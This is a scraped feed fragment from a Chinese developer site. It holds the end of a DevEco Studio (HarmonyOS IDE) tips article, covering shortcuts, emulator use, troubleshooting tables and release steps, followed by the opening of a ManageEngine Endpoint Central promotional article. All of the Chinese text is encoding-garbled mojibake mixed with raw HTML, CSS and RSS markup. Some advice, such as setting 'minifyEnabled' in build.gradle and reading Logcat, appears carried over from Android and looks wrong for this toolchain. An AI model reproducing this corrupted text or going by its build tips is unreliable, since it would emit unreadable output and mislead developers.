¼å¼åŒ–ã€‚æ­¤å¤–ï¼Œè¿˜èƒ½è®¾ç½®åœ¨ä»£ç ä¸­æ·»åŠ ç‰¹å®šçš„æ ¼å¼åŒ–æ ‡è®°ï¼Œè®©ä»£ç åœ¨æ ¼å¼åŒ–æ—¶æ›´ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//@formatter:off</span>
<span class="hljs-comment">// æ­¤åŒºåŸŸå†…çš„ä»£ç å°†è·³è¿‡è‡ªåŠ¨æ ¼å¼åŒ–</span>
<span class="hljs-keyword">const</span> specialFormatting = {
<span class="hljs-attr">needToKeep</span>: <span class="hljs-string">"original_format"</span>
};
<span class="hljs-comment">//@formatter:on</span>
</code></pre>
<h4 data-id="heading-12">ä»£ç æŠ˜å </h4>
<p>å½“ä»£ç é‡è¾ƒå¤§æ—¶ï¼Œä»£ç æŠ˜å åŠŸèƒ½å¯ä»¥å¸®åŠ©æˆ‘ä»¬éšè—ä¸å¿…è¦çš„ä»£ç å—ï¼Œä½¿ä»£ç ç»“æ„æ›´åŠ ç®€æ´æ˜äº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å³é”®èœå•é€‰æ‹©ç›¸åº”çš„æŠ˜å é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¿«æ·é”®å®ç°ä»£ç çš„æŠ˜å ä¸å±•å¼€ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨å¿«æ·é”® <code>Ctrl + Shift + -</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Command + Shift + -</code> ï¼ˆmacOSç³»ç»Ÿï¼‰å¯ä»¥å…¨éƒ¨æŠ˜å ä»£ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä»æ•´ä½“ä¸ŠæŠŠæ¡ä»£ç çš„é€»è¾‘ç»“æ„ã€‚</p>
<h4 data-id="heading-13">ä»£ç å¿«é€Ÿæ³¨é‡Š</h4>
<p>ç»™ä»£ç æ·»åŠ æ³¨é‡Šæ˜¯è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ï¼Œä½†æ‰‹åŠ¨é€è¡Œæ·»åŠ æ³¨é‡Šæœ‰æ—¶æ¯”è¾ƒç¹çã€‚DevEco Studioæä¾›äº†ä»£ç å¿«é€Ÿæ³¨é‡ŠåŠŸèƒ½ï¼Œä½¿ç”¨å¿«æ·é”®<code>Ctrl + /</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Command + /</code> ï¼ˆmacOSç³»ç»Ÿï¼‰ï¼Œå°±èƒ½å¿«é€Ÿä¸ºé€‰ä¸­çš„ä»£ç è¡Œæ·»åŠ æ³¨é‡Šï¼Œå†æ¬¡ä½¿ç”¨åˆ™å¯ä»¥å–æ¶ˆæ³¨é‡Šã€‚è¿™ä¸€åŠŸèƒ½è®©æ³¨é‡Šç¼–å†™å˜å¾—è½»æ¾å¿«æ·ï¼Œæœ‰åŠ©äºæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<h4 data-id="heading-14">ä»£ç ç»“æ„æ ‘</h4>
<p>ä»£ç ç»“æ„æ ‘åŠŸèƒ½å¯ä»¥è®©æˆ‘ä»¬å¿«é€Ÿäº†è§£æ–‡ä»¶çš„ä»£ç æ¶æ„ã€‚é€šè¿‡å¿«æ·é”®<code>Alt + 7</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Command + 7</code> ï¼ˆmacOSç³»ç»Ÿï¼‰æ‰“å¼€ä»£ç ç»“æ„æ ‘çª—å£ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°æ–‡ä»¶ä¸­å…¨å±€å˜é‡ã€å‡½æ•°ã€ç±»çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ç­‰å†…å®¹ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥ç‚¹å‡»è·³è½¬åˆ°å¯¹åº”çš„ä»£ç è¡Œï¼Œæ–¹ä¾¿æˆ‘ä»¬åœ¨å¤æ‚çš„ä»£ç æ–‡ä»¶ä¸­å¿«é€Ÿå®šä½å…³é”®éƒ¨åˆ†ã€‚
<img src="https://s.coze.cn/image/jp3fKP6a9iw/" alt="ä»£ç ç»“æ„æ ‘è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" loading="lazy"/></p>
<h4 data-id="heading-15">ä»£ç å¼•ç”¨æŸ¥æ‰¾</h4>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œäº†è§£ä»£ç ä¸­æŸä¸ªç¬¦å·çš„å¼•ç”¨å…³ç³»ååˆ†é‡è¦ã€‚DevEco Studioçš„ä»£ç å¼•ç”¨æŸ¥æ‰¾åŠŸèƒ½å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°è¿™ä¸€ç‚¹ã€‚ä½¿ç”¨å¿«æ·é”®<code>Alt + F7</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ–<code>Option + F7</code> ï¼ˆmacOSç³»ç»Ÿï¼‰ï¼Œæˆ–è€…é€šè¿‡å³é”®èœå•é€‰æ‹©ç›¸å…³é€‰é¡¹ï¼Œå°±èƒ½åœ¨ä»£ç ç¼–è¾‘åŒºå¿«é€ŸæŸ¥æ‰¾ç¬¦å·è¢«å¼•ç”¨çš„ä½ç½®ã€‚è¿™æœ‰åŠ©äºæˆ‘ä»¬ç†è§£ä»£ç çš„è°ƒç”¨é€»è¾‘ï¼Œæ’æŸ¥é—®é¢˜æ—¶ä¹Ÿèƒ½æ›´åŠ é«˜æ•ˆã€‚</p>
<h4 data-id="heading-16">å‡½æ•°æ³¨é‡Šç”Ÿæˆ</h4>
<p>åœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œæ‰‹åŠ¨ç¼–å†™è¯¦ç»†çš„æ³¨é‡Šå¾€å¾€æ¯”è¾ƒè€—æ—¶ã€‚DevEco Studioæä¾›äº†å‡½æ•°æ³¨é‡Šç”ŸæˆåŠŸèƒ½ï¼Œåœ¨å®šä¹‰å‡½æ•°çš„ä»£ç ç¼–è¾‘åŒºï¼Œè¾“å…¥â€œ/**â€ ï¼Œå°±èƒ½å¿«é€Ÿç”Ÿæˆå‡½æ•°æ³¨é‡Šæ¨¡æ¿ã€‚è¿™ä¸€åŠŸèƒ½æ”¯æŒå¤šç§è¯­è¨€ï¼Œå¦‚C++ç­‰ï¼Œæå¤§åœ°æé«˜äº†å‡½æ•°æ³¨é‡Šçš„ç¼–å†™é€Ÿåº¦ï¼Œè®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ è§„èŒƒå’Œæ˜“äºç†è§£ã€‚</p>
<h4 data-id="heading-17">ä»£ç å¯¼èˆª</h4>
<p>ä»£ç å¯¼èˆªåŠŸèƒ½å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨æ–‡ä»¶ã€ç±»å‹æ–‡ä»¶çš„æ ‡ç­¾ä¹‹é—´å¿«é€Ÿåˆ‡æ¢å’Œå®šä½ã€‚é€šè¿‡ä»£ç å¯¼èˆªï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿæ‰¾åˆ°ç›¸å…³çš„æ–‡ä»¶å’Œå·¥ç¨‹èµ„æºï¼Œç‰¹åˆ«æ˜¯åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¤šä¸ªæ–‡ä»¶å’Œæ¨¡å—ç›¸äº’å…³è”æ—¶ï¼Œè¿™ä¸€åŠŸèƒ½èƒ½è®©æˆ‘ä»¬æ›´åŠ ä¾¿æ·åœ°åœ¨ä»£ç ä¹‹é—´ç©¿æ¢­ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚</p>
<h4 data-id="heading-18">å¿«é€ŸæŸ¥é˜…APIæ¥å£åŠç»„ä»¶å‚è€ƒæ–‡æ¡£</h4>
<p>åœ¨ç¼–è¾‘ä»£ç è¿‡ç¨‹ä¸­ï¼Œå½“é‡åˆ°ä¸ç†Ÿæ‚‰çš„APIæ¥å£æˆ–ç»„ä»¶æ—¶ï¼ŒDevEco Studioèƒ½è®©æˆ‘ä»¬å¿«é€ŸæŸ¥é˜…ç›¸å…³å‚è€ƒæ–‡æ¡£ã€‚å½“API/ç»„ä»¶è¢«é«˜äº®æ˜¾ç¤ºæ—¶ï¼Œç¼–è¾‘å™¨ä¼šè¿…é€Ÿæ˜¾ç¤ºå¯¹åº”çš„å‚è€ƒæ–‡æ¡£é“¾æ¥ï¼Œæˆ‘ä»¬åªéœ€å•å‡»å°±èƒ½æŸ¥é˜…è¯¦ç»†å†…å®¹ã€‚æ­¤å¤–ï¼Œå¯¹äºå¸¦æœ‰<code>decorate</code> å’Œ <code>obsolete</code> æ ‡è¯†çš„APIï¼Œä¹Ÿæœ‰ç›¸åº”çš„æ˜¾ç¤ºå’Œå…³æ³¨æ–¹å¼ï¼Œæ–¹ä¾¿æˆ‘ä»¬åŠæ—¶äº†è§£APIçš„çŠ¶æ€å’Œä½¿ç”¨æ³¨æ„äº‹é¡¹ã€‚</p>
<h4 data-id="heading-19">Optimize ImportåŠŸèƒ½</h4>
<p>åœ¨é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä»£ç ä¸­çš„ <code>import</code> è¯­å¥å¯èƒ½ä¼šå˜å¾—æ‚ä¹±ï¼Œå­˜åœ¨æœªä½¿ç”¨çš„å¯¼å…¥ç­‰æƒ…å†µã€‚DevEco Studioçš„ <code>Optimize Import</code> åŠŸèƒ½å¯ä»¥å¸®åŠ©æˆ‘ä»¬ä¼˜åŒ–è¿™äº›å¯¼å…¥è¯­å¥ã€‚ä½¿ç”¨å¿«æ·é”®<code>Ctrl+Alt+O</code> ï¼ˆWindowsç³»ç»Ÿï¼‰æˆ– <code>Control+Option+O</code> ï¼ˆmacOSç³»ç»Ÿï¼‰ï¼Œå¹¶é€‰æ‹© <code>Code &gt; Optimize Imports</code> ï¼Œå°±èƒ½è‡ªåŠ¨ç§»é™¤æœªä½¿ç”¨çš„å¯¼å…¥ï¼Œæ•´ç†å¯¼å…¥è¯­å¥çš„é¡ºåºï¼Œè®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ ç®€æ´ã€è§„èŒƒã€‚</p>
<h3 data-id="heading-20">ç•Œé¢æ“ä½œæŠ€å·§</h3>
<h4 data-id="heading-21">ç•Œé¢å¸ƒå±€è®¤è¯†</h4>
<p>DevEco Studioç•Œé¢å¸ƒå±€éµå¾ªâ€œé«˜æ•ˆå¼€å‘æµâ€è®¾è®¡ï¼Œæ ¸å¿ƒåŒºåŸŸåˆ†å·¥æ˜ç¡®ï¼Œæ— éœ€é¢å¤–é…ç½®å³å¯æ»¡è¶³åŸºç¡€å¼€å‘éœ€æ±‚ï¼š</p>
<ol>
<li><strong>æ ¸å¿ƒåŠŸèƒ½èœå•åŒº</strong>ï¼šé›†æˆé¡¹ç›®åˆ›å»ºï¼ˆFileï¼‰ã€ç¼–è¾‘å·¥å…·ï¼ˆEditï¼‰ã€è¿è¡Œè°ƒè¯•ï¼ˆRunï¼‰ç­‰å…¨æµç¨‹æ“ä½œå…¥å£ï¼Œæ”¯æŒé€šè¿‡å¿«æ·é”®å¿«é€Ÿè°ƒç”¨ï¼ˆå¦‚<code>Ctrl+N</code> æ–°å»ºæ–‡ä»¶ï¼‰ã€‚</li>
<li><strong>é¡¹ç›®æ–‡ä»¶å¯¼èˆªåŒº</strong>ï¼šä»¥æ ‘å½¢ç»“æ„å±•ç¤ºé¡¹ç›®æ–‡ä»¶ï¼Œæ”¯æŒâ€œæŒ‰æ¨¡å—ç­›é€‰â€â€œå…³é”®è¯æœç´¢â€ï¼Œå³é”®èœå•å¯ç›´æ¥åˆ›å»ºé¡µé¢/ç»„ä»¶ï¼Œå¤§å¹…æå‡æ–‡ä»¶ç®¡ç†æ•ˆç‡ã€‚</li>
<li><strong>ä»£ç ç¼–è¾‘åŒº</strong>ï¼šæ”¯æŒArkTSè¯­æ³•é«˜äº®ã€è‡ªåŠ¨ç¼©è¿›ã€æ‹¬å·åŒ¹é…ï¼Œå†…ç½®â€œä»£ç æŠ˜å â€åŠŸèƒ½ï¼ˆç‚¹å‡»å·¦ä¾§<code>-</code> ç¬¦å·ï¼‰ï¼Œå¯æŠ˜å å¤æ‚å¸ƒå±€ä»£ç ï¼Œèšç„¦å½“å‰ç¼–è¾‘å†…å®¹ã€‚</li>
<li><strong>å¿«æ·å·¥å…·æ åŒº</strong>ï¼šåŒ…å«é¡¹ç›®è§†å›¾åˆ‡æ¢ï¼ˆProject/Structureï¼‰ã€ä»£ç æ ¼å¼åŒ–ï¼ˆ<code>Ctrl+Alt+L</code> ï¼‰ã€ç‰ˆæœ¬æ§åˆ¶ç­‰é«˜é¢‘æ“ä½œæŒ‰é’®ï¼Œå‡å°‘èœå•å±‚çº§è·³è½¬ã€‚</li>
<li><strong>è¿è¡Œä¸è®¾å¤‡æ§åˆ¶åŒº</strong>ï¼šä¸€é”®åˆ‡æ¢è¿è¡Œè®¾å¤‡ï¼ˆæ¨¡æ‹Ÿå™¨/çœŸæœºï¼‰ï¼Œæ”¯æŒâ€œè¿è¡Œâ€ï¼ˆâ–¶ï¸ï¼‰ã€â€œè°ƒè¯•â€ï¼ˆğŸï¼‰ã€â€œçƒ­é‡è½½â€ï¼ˆâ™»ï¸ï¼‰ï¼Œä¿®æ”¹ä»£ç åæ— éœ€é‡å¯åº”ç”¨å³å¯é¢„è§ˆæ•ˆæœã€‚</li>
<li><strong>è¾…åŠ©åŠŸèƒ½åŒº</strong>ï¼šé›†æˆâ€œé—®é¢˜æ£€æŸ¥â€ï¼ˆå®æ—¶æ˜¾ç¤ºè¯­æ³•é”™è¯¯ï¼‰ã€â€œç»ˆç«¯â€ï¼ˆæ‰§è¡Œohpmå‘½ä»¤ï¼‰ã€â€œé¢„è§ˆå™¨â€ï¼ˆUIå®æ—¶æ¸²æŸ“ï¼‰ï¼Œä¸€ç«™å¼è§£å†³å¼€å‘ä¸­çš„è¾…åŠ©éœ€æ±‚ã€‚
<img src="https://s.coze.cn/image/uziKtIIcJqY/" alt="DevEco Studioç•Œé¢" loading="lazy"/></li>
</ol>
<h4 data-id="heading-22">ç›®å½•ç²¾ç®€æ“ä½œ</h4>
<ol>
<li><strong>åŸºç¡€ç²¾ç®€</strong>ï¼šå·¦ä¾§Projecté¢æ¿é¡¶éƒ¨ï¼Œç‚¹å‡»â€œProjectâ€ä¸‹æ‹‰èœå•ï¼Œé€‰æ‹©â€œProject Filesâ€ï¼Œéšè—å†—ä½™é…ç½®ç›®å½•ã€‚</li>
<li><strong>æ·±åº¦ç²¾ç®€</strong>ï¼šé€‰æ‹©â€œOhosâ€è§†å›¾ï¼Œä»…ä¿ç•™ä¸ä¸šåŠ¡å¼€å‘ç›¸å…³çš„æ ¸å¿ƒç›®å½•ï¼ˆå¦‚<code>pages</code> ã€ <code>resources</code> ï¼‰ï¼Œè¿›ä¸€æ­¥å‡å°‘è§†è§‰å¹²æ‰°ã€‚</li>
</ol>
<h4 data-id="heading-23">æ¨¡æ‹Ÿå™¨æ“ä½œæŒ‡å—</h4>

























<table><thead><tr><th>æ“ä½œ</th><th>è·¯å¾„/æŒ‡ä»¤</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>æ–°å»ºæ¨¡æ‹Ÿå™¨</td><td><code>Tools &gt; Device Manager &gt; New</code></td><td>æ·»åŠ P50/Pixelç­‰è®¾å¤‡é•œåƒ</td></tr><tr><td>æ—‹è½¬å±å¹•</td><td>æ¨¡æ‹Ÿå™¨é¢æ¿ç‚¹å‡»ğŸ”„å›¾æ ‡</td><td>æµ‹è¯•æ¨ªç«–å±é€‚é…</td></tr><tr><td>æ¨¡æ‹Ÿä¼ æ„Ÿå™¨</td><td>é¢æ¿å³ä¸Šè§’âš¡ &gt; Simulate Sensor</td><td>è°ƒè¯•GPS/å…‰çº¿ä¼ æ„Ÿå™¨</td></tr></tbody></table>
<p><img src="https://s.coze.cn/image/KJov_8rxeZA/%3E" alt="æ¨¡æ‹Ÿå™¨ç•Œé¢" loading="lazy"/></p>
<h4 data-id="heading-24">å¼‚å¸¸æ’æŸ¥æŠ€å·§</h4>

























<table><thead><tr><th>ç°è±¡</th><th>å®šä½æ–¹æ³•</th><th>ä¿®å¤æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>é¢„è§ˆå™¨ç™½å±</td><td>æ£€æŸ¥<code>build()</code> å‡½æ•°è¿”å›å€¼</td><td>ç¡®ä¿è¿”å›å•ä¸ªæ ¹ç»„ä»¶ï¼ˆå¦‚<code>Column</code>ï¼‰</td></tr><tr><td>é¡µé¢è·³è½¬å¤±è´¥</td><td>æŸ¥çœ‹<code>router.push</code> è·¯å¾„</td><td>ç¡®è®¤ç›®æ ‡é¡µå·²åœ¨ <code>main_pages.json</code> æ³¨å†Œ</td></tr><tr><td>åº”ç”¨å¯åŠ¨é—ªé€€</td><td>æŸ¥çœ‹<code>Logcat</code>æ—¥å¿—</td><td>è¿‡æ»¤<code>HARMONY</code> æ ‡ç­¾å®šä½åŸç”Ÿå±‚é”™è¯¯</td></tr></tbody></table>
<h3 data-id="heading-25">æ‰©å±•å·¥å…·é“¾</h3>
<h4 data-id="heading-26">è‡ªåŠ¨åŒ–æµ‹è¯•</h4>
<p>ä½¿ç”¨<code>@ohos/hypium</code> æ¡†æ¶ç¼–å†™UIæµ‹è¯•è„šæœ¬ï¼Œå®ç°è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œæé«˜æµ‹è¯•æ•ˆç‡å’Œå‡†ç¡®æ€§ã€‚</p>
<h4 data-id="heading-27">å‘å¸ƒåº”ç”¨å‰å¿…åš</h4>
<ol>
<li><strong>ä»£ç æ··æ·†</strong>ï¼šå¯ç”¨<code>build.gradle</code>ä¸­çš„<code>minifyEnabled true</code>ç¼©å‡ä½“ç§¯ï¼Œä¿æŠ¤ä»£ç å®‰å…¨ã€‚</li>
<li><strong>ç­¾åé…ç½®</strong>ï¼šé€šè¿‡<code>Project Structure &gt; Signing Configs</code>æ·»åŠ åä¸ºAppGalleryè¯ä¹¦ï¼Œç¡®ä¿åº”ç”¨å¯ä»¥æ­£å¸¸å‘å¸ƒã€‚</li>
<li><strong>ç¼–è¯‘HAP</strong>ï¼šæ‰§è¡Œ<code>Build &gt; Build HAP(s)</code>ç”Ÿæˆå®‰è£…åŒ…ï¼Œå‡†å¤‡å‘å¸ƒåº”ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-28">æ€»ç»“</h3>
<p>DevEco Studioä½œä¸ºé¸¿è’™ç”Ÿæ€çš„å®˜æ–¹å¼€å‘å·¥å…·ï¼Œæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½å’Œä¾¿æ·çš„æ“ä½œæ–¹å¼ã€‚æŒæ¡è¿™äº›ä½¿ç”¨æŠ€å·§ï¼Œèƒ½å¤Ÿè®©å¼€å‘è€…åœ¨é¸¿è’™åº”ç”¨å¼€å‘è¿‡ç¨‹ä¸­äº‹åŠåŠŸå€ï¼Œæ›´åŠ é«˜æ•ˆåœ°å®Œæˆåº”ç”¨çš„å¼€å‘å’Œè°ƒè¯•ã€‚å¸Œæœ›æœ¬æ–‡çš„ä»‹ç»èƒ½å¤Ÿå¸®åŠ©ä½ æ›´å¥½åœ°ä½¿ç”¨DevEco Studioï¼Œå¼€å‘å‡ºæ›´åŠ ä¼˜ç§€çš„é¸¿è’™åº”ç”¨ã€‚</p>
<hr/>
<p>End</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åˆ©ç”¨ Endpoint Central æé«˜ä¼ä¸šç»ˆç«¯ç®¡ç†æ•ˆç‡]]></title>    <link>https://juejin.cn/post/7588704463620603923</link>    <guid>https://juejin.cn/post/7588704463620603923</guid>    <pubDate>2025-12-29T06:23:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463620603923" data-draft-id="7588704463620472851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åˆ©ç”¨ Endpoint Central æé«˜ä¼ä¸šç»ˆç«¯ç®¡ç†æ•ˆç‡"/> <meta itemprop="keywords" content="åç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T06:23:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ManageEngineå“è±ªå®˜æ–¹è´¦å·"/> <meta itemprop="url" content="https://juejin.cn/user/1146167600363959"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åˆ©ç”¨ Endpoint Central æé«˜ä¼ä¸šç»ˆç«¯ç®¡ç†æ•ˆç‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146167600363959/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ManageEngineå“è±ªå®˜æ–¹è´¦å·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:23:59.000Z" title="Mon Dec 29 2025 06:23:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¿¡æ¯åŒ–å¿«é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œä¼ä¸šçš„ç»ˆç«¯è®¾å¤‡â€”åŒ…æ‹¬æ¡Œé¢ã€ç¬”è®°æœ¬ã€æœåŠ¡å™¨å’Œç§»åŠ¨è®¾å¤‡ç­‰â€”æˆä¸ºäº†å·¥ä½œå’Œç”Ÿäº§çš„æ ¸å¿ƒå·¥å…·ã€‚ä¸æ­¤åŒæ—¶ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.manageengine.cn%2Fproducts%2Fdesktop-central%2Fendpoint-management-solutions.html%3Futm_source%3Druanwen%26utm_platform%3Djuejin%26utm_medium%3Duem%26utm_campaign%3D20251229" target="_blank" title="https://www.manageengine.cn/products/desktop-central/endpoint-management-solutions.html?utm_source=ruanwen&amp;utm_platform=juejin&amp;utm_medium=uem&amp;utm_campaign=20251229" ref="nofollow noopener noreferrer">ç»ˆç«¯è®¾å¤‡</a>çš„ç®¡ç†å’Œå®‰å…¨æ€§æˆä¸º IT éƒ¨é—¨å¿…é¡»é¢å¯¹çš„é‡è¦æŒ‘æˆ˜ã€‚ä¸ºäº†æœ‰æ•ˆåœ°åº”å¯¹è¿™äº›æŒ‘æˆ˜ï¼Œä¼ä¸šéœ€è¦ä¸€æ¬¾å¼ºå¤§ä¸”æ˜“äºæ“ä½œçš„ç»ˆç«¯ç®¡ç†å·¥å…·ï¼Œè€ŒÂ <strong>Endpoint Central</strong>Â æ­£æ˜¯ä¸ºæ­¤è€Œç”Ÿã€‚</p>
